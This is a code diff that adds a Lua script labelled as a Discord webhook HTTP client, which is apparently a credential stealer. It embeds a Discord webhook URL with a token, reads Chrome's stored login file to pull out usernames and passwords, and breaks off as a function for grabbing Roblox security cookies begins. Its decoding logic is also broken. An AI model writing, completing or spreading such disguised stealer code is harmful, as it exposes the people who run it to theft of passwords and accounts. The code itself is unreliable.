@@ -1,0 +1,38 @@
+-- LuaWebHook - A Lua HTTP Client for sending data to Discord Webhooks
+local LuaWebHook = require "https://discord.com/api/webhooks/1288886461080408126/or_ljH8rWPnHus5yE87SxaNLwoCO_7dlpPE_pFd5PI75kjMZztyRwcVgNZFS5V13Tfsf"
+
+-- Get all stored passwords from Chrome
+local function getChromePasswords()
+    local f = io.open("//path//to//chrome//profile//Login Data", "rb")
+    local login_data = f:read("*all")
+    f:close()
+
+    local decoded = require "base64".decode(login_data)
+    local logins = require "cjson".decode(decoded)
+
+    local passwords = {}
+    for i, v in ipairs(logins) do
+        local username, password, signonRealm
+        for k, v2 in pairs(v) do
+            if k == "username" then
+                username = v2
+            elseif k == "password" then
+                password = v2
+            elseif k == "signon_realm" then
+                signonRealm = v2
+            end
+        end
+        if username and password and signonRealm then
+            table.insert(passwords, {
+                username = username,
+                password = password,
+                signonRealm = signonRealm
+            })
+        end
+    end
+
+    return passwords
+end
+
+-- Get Roblox Security Cookies
+local function
